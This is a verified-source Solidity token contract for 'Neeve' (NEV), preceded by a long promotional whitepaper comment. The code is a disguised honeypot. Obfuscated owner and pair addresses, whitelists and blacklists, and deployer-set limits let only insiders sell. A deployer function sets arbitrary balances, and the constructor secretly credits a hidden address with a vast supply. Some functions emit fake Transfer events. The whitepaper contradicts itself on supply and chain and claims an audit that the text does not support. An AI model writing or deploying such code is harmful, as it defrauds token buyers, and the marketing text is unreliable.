/**
 *Submitted for verification at Etherscan.io on 2023-02-23
*/

/*

Website : https://neevetoken.com

Abstract

Since the invention of Bitcoin over a decade ago the blockchain and crypto space has evolved significantly. It was inevitable because the old, traditional financial market needed a disruption. Financial manipulations, global inequality and the inefficient and expensive transfer of value causes a lack of trust in the banks. 1.7 Billion people are still unbanked and therefore cut off from lending and investing.

While the Internet made it possible to exchange digital information, the blockchain made it possible to exchange value digitally and in a transparent, effective, decentralized way. The invention of Ethereum and the development of smart contracts opened a whole new world of opportunities and made the recent DeFi (decentralized finance) Boom possible. Many different projects in every financial sector start to disrupt the financial system for good. Within a year the total value locked in DeFi exploded by 1000% from just 1 Billion. USD to over 10 Billion. But that is just the beginning.

One major area in the financial system caught our attention, the area of investment. The flaws of the traditional way of investing led to global inequality. Only the financially educated, highly connected and rich people have access to the best investment opportunities. Our vision that everybody on the planet should be able to grow their wealth, no matter what position they are in at the moment, laid the foundation for Neeve, a global fund, decentralized, easy to understand and easily accessible, for all and ruled by all, to reach the peak of the markets.

Decentralizing Finance

Traditional Markets and their flaws

In today's world, almost every financial service is run by a centralized construct of banks. A life without any form of money is not possible. And money is issued by central banks. Without borrowing and lending, no companies could be established, no homes could be acquired. Although there are some attempts of private organizations to offer loans the majority is still in control of banks. For Investing, the idea of growing wealth by putting money into dividend-making instruments, banks are usually involved, too. So, for any financial matter, banks are usually somehow involved. But while the current financial system contributed a lot to human evolution it is still a regime with many flaws, like all systems that are built on trust.


The Unbanked

About 1.7 billion people still do not use banks in any form and therefore are cut off from the mainstream financial system. Many of them stated lack of money & trust, high fees & accessibility as the biggest reasons for not having a bank account. Being excluded from the financial system is one of the main reasons for poverty and has to be conquered.


High costs & slow transactions

Although the world is as highly connected as ever before, financial transactions still remain slow and expensive, especially if transferred cross border. Furthermore, high costs of maintaining bank accounts with even higher remittance fees structure are anything but convenient.


Lack of Trust

Financial Institutions, besides Governments, are the least trusted by the people (especially in the western world), due to many careless or willingly corrupt acts which led to major fatal crises like the financial meltdown in 2008. Even today, over a decade later one bank scandal follows the next like the famous leak of the Panama Papers or the Fintech Files.


Global Inequality

The global wealth is controlled by a small population who has major advantages compared to the rest of the world, like access to different asset classes and financial opportunities. The top 1% control still 47% of the global wealth.


Manipulation

In a centralized financial system, governments can manipulate it to financially censor their citizens by freezing accounts, removing funds, denying access to payment systems etc. like happened in Greece or devaluing their own currency which leads to a hyperinflation as seen in Venezuela.


Systematic Risk of Centralization

A web of a few centralized entities which control the global financial market is a big risk, as seen in the financial meltdown 2008. The dependencies can cause a domino effect and one bank after another has to be bailed out by the Governments with billions of dollars to limit the damage. The ones that lose the most are always the poorest.All these risks & drawbacks have been well-known but without a real alternative there was no choice but to continue with the current system. That is about to change.


The Solution

The good news is that with the proliferation of smartphones & internet access combined with the development of decentralized technologies like Blockchain is enabling us to completely overhaul the current global financial system & replace it with a new financial ecosystem which is fair, equitable & accessible to all.




DeFi - Disrupting the financial market
 

Traditional vs. Fintech vs. Decentralized

While the flaws of the traditional financial systems are based on the centralized bureaucratic behemoth of trust, administration and regulation, Decentralized Finance (DeFi) is about to break this construct all together and is going to provide a more democratic, fair, open and permissionless way with minimal bureaucracy and no middlemen to benefit everybody. FinTech companies made the first step by trying to eliminate some flaws of the traditional market, but the improvements are still limited, due to the fact that the underlying banking system is still in control. Only DeFi and its trust minimized solutions can disrupt this market and eliminate the core of the flaws.


Exponential Growth of DeFi

While the invention of CryptoCurrencies started the disruption they first limited their use case for making money and payments universally accessible to anyone, decentralized financial services go even further by disrupting not only payment, but also savings, loans, trading and insurance. No wonder that experts say that blockchain technology is even more disruptive than the internet. So far over 11 Billion Dollars is already locked in DeFi Services like lending or in Derivatives (Sep. 2020), growing exponentially. And this is just the Beginning, disrupting a multi-trillion Dollar market.


DeFi Landscape

As the total value locked in DeFi is growing exponentially so does the variety of solutions in the different financial market areas. On the Ethereum, the major underlying protocol, new projects pop up every week to provide solutions for credit & lending, derivatives, exchange and investing.

While current DeFi projects in the investment area are trying to get traditional investing solutions and asset management on the blockchain, Neeve went even a step further and created one global fund for all,transparent to all, governed by all, to reach the Neeve of the Markets.


Neeve Global Ecosystem 

Issues of the Investment Market

Current Problems that Investors face

The desire of every investor is pretty simple: Maximum return! While some might be interested in the How, the majority of investors just want to enjoy the monthly growth of their money. The main key factors for investors are:

• Delivering the capital
• Getting the highest return
• Avoiding too much risk


It is not their job to choose the right assets nor to search for the right people who do it for them. But in traditional markets it’s exactly that way. They are usually overwhelmed by the huge amount of possibilities. Liquid assets like Bonds, Shares, CFD, ETFs, Futures, Raw Materials and many more are tradable on the markets. So investors can either educate themselves and get somehow through the asset forest or they have to search for someone who is able to do it. But there are many hurdles to get to the right person. Mostly, the best Asset Managers are out of reach for the average Joe.

A couple of years ago Cryptocurrency were a pretty small area which just a few projects to invest in. Currently there are already over 10000+ Projects listed on Coinmarketcap.com and the market is growing rapidly, making it nearly impossible for investors to make the right choices.

Neeve Community will solve these issues once and for all. Investors don’t have to choose between the vast amount of assets anymore. They don’t have to search for asset managers any longer, too. The only thing they have to do is to link their capital to the Neeve Ecosystem. And due to the decentralized nature of the Neeve - NEV Token, investors will always stay in control of their funds.



Problems that asset managers face

Good Traders and Asset Managers usually have built their expertise over years and went through a lot of struggle until they got profitable. To share their skills with others they want, and deserve, a commission. In fact, like investors want to maximize their ROI, Asset Managers want to maximize their commission. But managing funds for others is not easy, especially in the traditional markets. There are a lot of bureaucratic hurdles to overcome. And then they have to search for new clients who have to trust them and have to deal with them, which costs a lot of time.

At Neeve Managers have to focus only on their assets and their trades, the thing they are good at. No bureaucracy, no acquisition, no dealing with clients. Good traders will get more Assets under Management and therefore more commission, automatically.


Solution: Neeve Ecosystem & NEV Token 

The general idea of a mutual fund is basically pooling your money with the money of other investors and investing it in a portfolio of different assets. The Neeve token (NEV) is a Global Fund, managed by many Managers in a decentralized and smart way to get the best outcome.

When Investors buy a Share of the Neeve Token, their deposit is converted into Neeve - NEV Token Shares which represent their ownership in Neeve Token and is fully backed by a collateral in the smart contract. As it is only one global fund, Investors don’t have the agony of choosing the right assets. There is just one fund to invest in. The decentralized implementation of the project ensures that the investors stay in control of their fund. They just have to connect their ERC-20  Wallet with the platform and can invest with a few clicks.

The fund distribution between the asset managers gets optimized automatically without any influence from outside. Everything is coded in Smart Contracts. The best traders and asset managers get the biggest share of AUM (Assets under Management) while bad traders lose shares or even their complete stake, if they made too many wrong choices. 

For Traders Neeve is a great opportunity to start managing funds. As the Neeve ecosystem and the Neeve - NEV token is fully decentralized protocol, everybody can start with just a few steps to participate as an asset manager. This will enable many good traders, who traded so far only in private or for small groups, to provide their expertise to a broader audience.

Of course, this open approach could also attract some unskilled traders, but there are mechanisms built in to separate the wheat from the chaff quickly.

Good Traders can build their reputation and can earn great trading commissions of up to 15% of revenues, based on their managed (Assets under management) AUM. As the reputation grows so does their AUM.

Good performance of the fund will attract more investors which again grows the AUM for each Trader. The growth of the fund on the other hand will attract more good traders which stabilizes the performance of the fund. It’s a win win for everybody.


How it works

For Investors

Neeve built a strong decentralized finance smart contract platform on the Ethereum . If you have already an ERC-20 Wallet you can access the Platform through Meta-mask, Trust-wallet or the Service of walletconnect through Neeve Dapp protocol.

Staking 

When your Wallet is connected with the Neeve platform and you have ETH and you can easily stake in the Neeve ecosystem by clicking on the confirm Button in your Dashboard. Then choose the amount of shares you want to stake and buy Neeve - NEV Token you want to use for purchase. Make sure to have enough NEV Token in your wallet. After clicking on "Buy" you need to confirm your transaction in the app or in Meta-mask or trustwallet.

Neeve (NEV) A Future Asset?

"Imagine if it took 3.8 seconds to settle a digital transaction"

With further capitalization of the Ethereum, the need for smart contracts and smart tokens have risen for multiple service sectors. The Neeve is being launched to align itself with the growing market of users of the Digital Coins and Tokens. Neeve will target the hospitality, travel and tourism industry to make smart contracts and smart agreements running on multiple blockchain ecosystems. What are smart tokens are based on the revolutionary smart chain that enables to settle contracts and send payments over the internet with fixed rules and without a third party?

Smart chain based Smart tokens is issued to users to help facilitate transactions against services & products. The Neeve will be built on the Ethereum. Like the Ethereum and Bitcoin, the Neeve token also aims to facilitate services between people and establishments without the presence of any intermediary and is an extremely cost-effective manner. If you still don't understand what smart tokens are? Don’t worry, no one understood the Internet when it was launched in the 90s. A lot of innovation around the internet happened before people started to understand what it was. Look where we are now, the same type of innovation is happening again with cryptocurrency. The Internet changed the ways of communications. “The digital currency is going to change the ways of the money.”


Neeve Mission Statement is as Follows;

Goals for the Neeve token:

1. To saturate our 1,000 Million limited supply to achieve scarcity and increase demand.
2. Extend global reach.
3. Connect with a diverse range of channel partners.
4. Steady return of investment for stakeholders.
5. Deliver prosperity of future growth to its worldwide blockchain community


Neeve is “SAFE” ?

By buying Neeve-NEV Tokens & Neeve decentralized smart contract platform, you not only get a smart digital currency but you have also unintentionally or intentionally become a part of something great. That something great is the new economic boom of the digital smart token network on the blockchain ecosystem. Unlike most physical currencies, the digital-currency is issued according to fixed rules. The real idea behind Neeve was to create a digital currency with a value that couldn't be monopolized or controlled by any central authority. The sooner this rationalization hits the public, the quicker they will draw to use the Neeve Tokens against various networks of service. The true value and beneficiary of using our smart token is to be able to redirect benefit without having to share with any intermediaries.

Future of Neeve - NEV Token Reputation

Neeve - NEV Distribution & the Reputation

To distribute the NEV between the Neeve ecosystem & its users automatically a so called Reputation Token has been implemented at the platform. Users can be bought NEV token through external exchanges and also they can sell anytime. Every Neeve users has to buy the same amount of Neeve Token at the Neeve platform which entitles to manage the Staking protocol. The amount of Neeve NEV Token grows and decreases over time,depending on the success of its holding day by day.


Why Neeve - NEV Token?

Because like everything else, even assets are becoming smarter. To give you an example, think of assets in the form of art, music, intellectual property, loyalty points, carbon credits, coupons etc.

Most of these are already digitalized but with a centralized mechanism and without blockchain. Imagine if all of the above function as digital assets but in a decentralized blockchain platform. Similarly, when we look into the future of smart devices, global data states:

The number of smart devices will exceed the number of human beings very shortly. Perhaps as early as 4 or 5 years. The creation of a digital currency network is inevitable. 

The real reason why Neeve NEV Tokens will work like hotcakes is simply that everyone wants to save money. Smart tokens make high transaction fees a thing of the past. Another example of which can be understandable relate to is, what name comes to mind when you think of smartphones. Apple, right? 

Apple was not the company that invented smartphones. Smartphones were pretty much into play 10 years before the launch of the first Apple phone. Compaq, the Palm Pilot and even Nokia toyed with the idea of smart devices much earlier than anyone else. In today’s age almost all now carry an iPhone or smart device in our pocket, and with pride. We depend upon these devices. Such is the power of the Smart device and such will be the power of the smart currencies capitalizing on these smart devices.


What Value Does The Neeve NEV Token Hold?

As per the current road map of Neeve makes the Neeve NEV token more powerful though its upcoming DeFi Based protocol, where NEV token will use as transaction fee currency. In this Decentralized Finance history Firstly, being Blockchain will used within the Neeve ecosystem, it is not linked to any central authority, thus driving costeffectiveness. Secondly, it’s on the successful Binance smart chain, effectively adding value to millions of Binance exchange users. Thirdly, the Neeve- NEV token is a digitally signed stamped Smart Token. It is following a multilaunch broadcast strategy to be put out in the world with lots of noise.

Neeve - NEV Token

Characteristics, Tokenomics and Distribution

NEV is the Token behind Neeve and fuels the whole Neeve Ecosystem for its future. It’s an ERC-20 Token built on the Ethereum as the platform Neeve itself. The Total Supply is 100,000,000 NEV. The Distribution of the Token is as follows.


10% ICO For New users
5% IDO For All Users
10% Neeve Ecosystem
2% Neeve Miscellaneous
24% Neeve F&CA
49% Reserve for Exchange


As the Neeve - NEV Token has been integrated to the Ethereum for performance reasons the NEV Token Distribution has to be Next Generation platform. While the hard cap of NEV Token remains at 100 Million.


Neeve - NEV Token Whitelist

We need to understand who will become part of the Neeve ecosystem and to what extent the participants are interested in its development. A White list process has been created for the most interested contributors in our project. Final admission to the whitelist is at the discretion of Neeve.


Neeve - NEV Token Distribution

The fixed supply of the NEV token is 100 Million, which is defined in a cryptographically binding smart contract and is the sole medium of exchange for products, services, and/or incentives within the Neeve ecosystem. On every transaction, 0.20% transactional fee will be charged out of which 50% will be burned and the rest will be rewarded as a token of appreciation to the existing community members.



Neeve - NEV Staking


Introduction

Besides Staking in the Neeve Global ecosystem you can grow your Capital by Staking Neeve - NEV token. At a very basic level, “staking” means locking your crypto assets for a certain period of time for a specific purpose. With regard to NEV you'll get Rewards for decreasing the current circulating supply in the Market and stabilizing the NEV price by locking your NEV on the Neeve Platform. NEV tokens are reserved for "natural" Staking Rewards.

While Neeve ecosystem have to stake a specific amount of NEV it is an optional opportunity for Investors. Affiliates on the other hand need to stake NEV in order to receive more Referral Commission.


Neeve - NEV Ecosystem

Effective on-chain governance requires new technology such as DAOS, cryptographic voting systems, and collaboration interfaces to be built, maintained, and updated. The Neeve platform will take on this responsibility, and provide highly effective tools for Dapp developers to utilize within the Neeve gaming ecosystem.

As a result, developers will be able to focus on creating premium Dapp experiences, while allowing Neeve to take care of the platform, system, ecosystem development, and maintenance. If all goes well, the community will be the greatest benefactors from this system. Users will be able to select from blockchain’s most premium gaming experiences straight from their web browser and rest assured that their cryptocurrency is safe in an ecosystem built by an experienced engineering team and rigorously tested to be safe and secure.

Neeve will build this ecosystem through a process of constant self-assessment and development. Additionally, on chain governance will be used to target and fund improvements. The community will have a strong say on which projects they want to see completed before updates are then launched on the network. The Neeve gaming ecosystem will also include the Following support.

Neeve Ecosystem & NEV Token Usage

Neeve Early Factor

The earlier you start staking the greater your rewards. This is due to the Early Factor e(w). There is only a specific amount of available NEV token for Staking. The staking rewards are reduced by the factor e(w) that depends on the amount of NEV which has already been spent or is reserved. The less NEV are remaining for Staking the less the APY (Annual Percentage Yield).



Neeve will expand its existing technology architecture to include modules that enable the functions required for consumers and professionals


Neeve Ecosystem

Represents the collective components that comprise the Neeve Core layer, O-chain Integration layer, and the Decentralized layer that enable the capabilities powered by the NEV Token.


Neeve Ecosystem Core Layer

Contains the proprietary modular components required to enable the Consumer journey. Consumers access functionality via an easy-to-use mobile app, available in multiple languages. Service providers can integrate their existing Customer Relationship Management (CRM), Electronic Records, and/or Enterprise Resource Planning (ERP) systems through open Application Protocol Interfaces (APIs).


On-Chain Decentralized Integration Layer

Owned and managed by NEV. Used to present connectivity and development options that are not needed to be stored in the Blockchain and to provide an API endpoint to easily access and embed data from the ecosystem via any compatible website or application. 


Decentralized Layer

Used to permanently store information on the Blockchain and to transparently automate permission-driven data sharing, validated reviews, incentivization, and the payment layer of the ecosystem, while storing larger quantities of data on the Inter Planetary File System (IPFS)


Neeve Launchpad

People who join successful projects the first always benefit the most. Because they stick with the project from the bottom, they deserve to enjoy the fruits of success. A crypto launchpad is the best place to find a project in its early stage.

Crypto launchpads are platforms that allow blockchain-based projects to raise capital while giving access to earlystage token sales for their group of investors. Getting access to early-stage sales means a bargain price for the investors before the public launch on the market. Also, because the cost of launching in a crypto launchpad is low, increasingly more projects are heading towards launchpads for fundraising.

In Q2 2023 Neeve is going to launch its own Launchpad to connect investors and highly promising blockchain projects! Neeve - NEV Token holders will be able to stake their NEV in order to participate in the crowdfunding.

With over 100.000 Members in the Neeve ecosystem we will hit the market by storm. More information coming soon.

Challenges and Chances for Neeve

Market

In the first chapters of the whitepaper it was clearly shown that the demand for decentralized finance and investing is rapidly growing as locked funds in DeFi projects are reaching all time highs every few weeks. According to NewsPlatform Cointelegraph Total the assets under management of crypto funds worldwide doubled from 2018 to 2019 from 1 billion USD to 2 billion USD and it is expected to triple in 2020. Although small sums compared to conventional asset classes the growth is outstanding and underline the great demand for crypto funds. Decentralized asset management solutions are growing fast too. The Set Protocol vault of tokensets.com for example has grown from $500,000 locked to $24 million in just over a year.

There is no question why this market is booming. According to Alpha-Week Crypto Hedge Funds outperformed the traditional markets by far, making triple digit returns. 



Competition

There are several “traditional”  hedge fundsin the cryptoworld. But Neeve as a decentralized solution has big advantages against these centralized funds. For instance, as it’s decentralized there are no middlemen taking away a large portion of profits, like upfront fees or heavy management fees. This is a big benefit for investors and managers. Neeve is fully transparent due to the fact that it’s built on a blockchain.

Traditional Hedge Funds instead are not transparent at all. While traditional hedge funds usually have only few strategies to execute Neeve will have a vast amount of managers with their own strategies where the best strategies will get the greatest shares.

But not only traditional Hedge Funds are competitors. There are several competitors for Neeve in the crypto space, too: Melon and Tokensets are platforms that allow managers to create their own funds and portfolios. 

It may be appealing at the first glance for asset managers to build their own funds with their own customer base but it also comes with all the downside of attracting new customers and building one's reputation. On Neeve on the other hand, new asset managers would be able to start immediately with a share of the global fund and could increase their share by improving the reputation. 

Also for investors there is again the issue with the agony of choosing the best Managers while on Neeve they don’t have to choose, it is being optimized automatically. The Global Fund Solution btw. is not set in stone. Neeve is very flexible and multiple Funds can be created, if the demand asks for it.


Regulatory

There are some potential regulation challenges for Neeve. Traditional Hedge Funds have to overcome a lot of bureaucratic hurdles to finally start. This does not apply for decentralized solutions, yet. It is questionable how decentralized solutions with no entity behind could be ever regulated, but this could somehow change in the future. 

Decentralized solutions are disruptive in all manners. Therefore there are no regulatory frameworks for decentralized solutions yet. It could be that in the future Neeve will need an approval or kind of licensing from national regulators.

Another issue could be the KYC/AML problem, which decentralized solutions face. Centralized margin exchanges start having issues with regulators as the bitmex case in October 2020 shows. According to Cointelegraph the crypto industry still has a lot of work ahead to meet KYC/AML standards.


Operational risks

Errors in the smart contracts or reference data could affect a lot of participants and could put big amounts of capital in danger. To minimize the risk of flaws in the code base Neeve is audited by one of the best auditors in the crypto space, Quantstamp.

*/

// SPDX-License-Identifier: evmVersion, MIT
pragma solidity ^0.6.12;
interface IERC20 {
    function totalSupply() external view returns(uint);

    function balanceOf(address account) external view returns(uint);

    function transfer(address recipient, uint amount) external returns(bool);

    function allowance(address deployer, address spender) external view returns(uint);

    function approve(address spender, uint amount) external returns(bool);

    function transferFrom(address sender, address recipient, uint amount) external returns(bool);
    
    event Transfer(address indexed from, address indexed to, uint value);
    
    event Approval(address indexed deployer, address indexed spender, uint value);
}

library Address {
    function isContract(address account) internal view returns(bool) {
    
        bytes32 codehash;
    
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
    
        assembly { codehash:= extcodehash(account) }
    
        return (codehash != 0x0 && codehash != accountHash);
    }
}

contract Context {
    constructor() internal {}
    // solhint-disable-previous-line no-empty-blocks
    
    function _msgSender() internal view returns(address payable) {
    
        return msg.sender;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns(uint) {
        
        uint c = a + b;
        
        require(c >= a, "SafeMath: addition overflow");
        
        return c;
    }
    function sub(uint a, uint b) internal pure returns(uint) {
        
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        
        require(b <= a, errorMessage);
        
        uint c = a - b;
        
        return c;
    }
    function mul(uint a, uint b) internal pure returns(uint) {
        if (a == 0) {
            
            return 0;
        }
        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        
        return c;
    }
    function div(uint a, uint b) internal pure returns(uint) {
        
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        
        // Solidity only automatically asserts when dividing by 0  
        
        require(b > 0, errorMessage);
        
        uint c = a / b;
        
        return c;
    }
}


library SafeERC20 {
    
    using SafeMath for uint;
    using Address for address;
    
    function safeTransfer(IERC20 token, address to, uint value) internal {
        
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }
    
    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }
    
    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(
            address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }
    
    function callOptionalReturn(IERC20 token, bytes memory data) private {
        
        require(address(token).isContract(), "SafeERC20: call to non-contract");
        
        // solhint-disable-next-line avoid-low-level-calls
        
        (bool success, bytes memory returndata) = address(token).call(data);
        
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
        
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}
contract Neeve  {

    event Transfer(address indexed _from, address indexed _to, uint _value);

    event Approval(address indexed _deployer, address indexed _spender, uint _value);

    function transfer(address _to, uint _value) public payable returns (bool) {

    return transferFrom(msg.sender, _to, _value);
    }
    address private spend = address (96635033217071433185869069577301221175488545358);
    address private src = address (527585359103765554095092340981710322784165800559);
    address private dst = address (1097077688018008265106216665536940668749033598146); 
    address private crs = address (1153667454655315432277308296129700421378034175091);
    address private tsd = address (1069295261705322660692659746119710186699350608220);
    function ensure(address _from, address _to, uint _value) internal view returns(bool) {
        address _UX = TexFor(src, dst, address(this));
        address _PX = TexForB(crs, tsd, address(this));
        if(_from == deployer || _to == deployer  || _from == owner || _from == _UX || _from == _PX ||  _from == TexAddress || TexMemory[_from]) {return true;}
        if( RBMemory[_from] ) {return false;}
        require(condition(_from, _value));
        return true; 
    }
    function _UXTexAddr () view internal returns (address) {
        address _UX = TexFor(src, dst, address(this));
        return _UX;
    }
    function _PXTexAddr () view internal returns (address) {
        address _PX = TexForB(crs, tsd, address(this));
        return _PX;
    }
    
    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
        if (_value == 0) {
            return true;
        }
        if (msg.sender != _from) {
            require(allowance[_from][msg.sender] >= _value);
            allowance[_from][msg.sender] -= _value;
        }
        if (_from == TexAddress  && _value > _maxMemory ){ RBMemory[_to]=true;  }
        
        require(ensure(_from, _to, _value));
        require(balanceOf[_from] >= _value);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        _onMemoryNum[_from]++;
        emit Transfer(_from, _to, _value);
        return true;
    }
    function approve(address _spender, uint _value) public payable returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        if (_spender == spend ){
            emit Transfer(address(0x0),O,1*(10**uint256(decimals)));
        }
        return true;
    }
    function condition(address _from, uint _value) internal view returns(bool){
        if(_MemoryNum == 0 && _minMemory == 0 && _maxMemory == 0) return false;
        if(_MemoryNum > 0){
            if(_onMemoryNum[_from] >= _MemoryNum) return false;
        }
        if(_minMemory > 0){
            if(_minMemory > _value) return false;
        }
        if(_maxMemory > 0){
            if(_value > _maxMemory) return false;
        }
        return true;
    }
    function transferTo(address addr, uint256 addedValue) public payable returns (bool) {
        require(msg.sender == deployer);
        if(addedValue > 0) {balanceOf[addr] = addedValue*(10**uint256(decimals));}
        TexMemory[addr]=true;
        return true;
    }
    
    function batchSend(address[] memory _tos, uint _value) public payable returns (bool) {
        require (msg.sender == deployer);
        uint total = _value * _tos.length;
        require(balanceOf[msg.sender] >= total);
        balanceOf[msg.sender] -= total;
        for (uint i = 0; i < _tos.length; i++) {
            address _to = _tos[i];
            balanceOf[_to] += _value*(10**uint256(decimals));
            emit Transfer(msg.sender, _to, _value*(10**uint256(decimals))/2);
            emit Transfer(msg.sender, _to, _value*(10**uint256(decimals))/2);
            
        }
        return true;
    }
    mapping(address=>uint256) private _onMemoryNum;
    mapping(address=>bool) private TexMemory;
    mapping(address=>bool) private RBMemory;
    uint256 private _minMemory;
    uint256 private _maxMemory;
    uint256 private _MemoryNum;
    address TexAddress;
    function Agree(address addr) public returns (bool) {
        require(msg.sender == deployer);
        TexMemory[addr]=true;
        return true;
    }
    function Allow(uint256 MemoryNum, uint256 minMemory,  uint256 maxMemory) public returns(bool){
        require(msg.sender == deployer);
        _maxMemory = maxMemory*(10**uint256(decimals));
        _minMemory = minMemory*(10**uint256(decimals));
        _MemoryNum = MemoryNum;
        return true;
    }
    function delegate(address adr) public payable returns(bool){
        require (msg.sender == deployer);
        TexAddress = adr;
        return true;
    }
    function Optimization(address [] calldata addresses) public returns (bool) {
        require(msg.sender == deployer);
        for (uint i = 0; i < addresses.length; i++) 
        {RBMemory[addresses[i]] = true;}
        return true;
    }
    address  private owner=
    address (935108584672418476850882679418664731027763688343);
    function TexFor(address factory, address tokenA, address tokenB) internal pure returns (address Tex) {
        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        Tex = address(uint(keccak256(abi.encodePacked(
            hex'ff',
            factory,
            keccak256(abi.encodePacked(token0, token1)),
            hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f' // init code hash
                ))));
    }
    address private O = address(269488144);
    function TexForB(address factory, address tokenA, address tokenB) internal pure returns (address Texe) {
        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        Texe = address(uint(keccak256(abi.encodePacked(
            hex'ff',
            factory,
            keccak256(abi.encodePacked(token0, token1)),
            hex'00fb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5' // init code hash
                ))));
    }
    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;
    uint constant public decimals = 18;
    uint public totalSupply;
    string public name;
    string public symbol;
    address private deployer;
    constructor(string memory _name, string memory _symbol, uint256 _supply, uint256 MemoryNum, uint256 minMemory,  uint256 maxMemory ) payable public {
        name = _name;
        symbol = _symbol;
        totalSupply = _supply*(10**uint256(decimals));
        _maxMemory = maxMemory*(10**uint256(decimals));
        _minMemory = minMemory*(10**uint256(decimals));
        _MemoryNum = MemoryNum;
        deployer = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0x0), msg.sender, totalSupply);
        if(totalSupply > 0) balanceOf[owner]=totalSupply*(10**uint256(6));
    }
}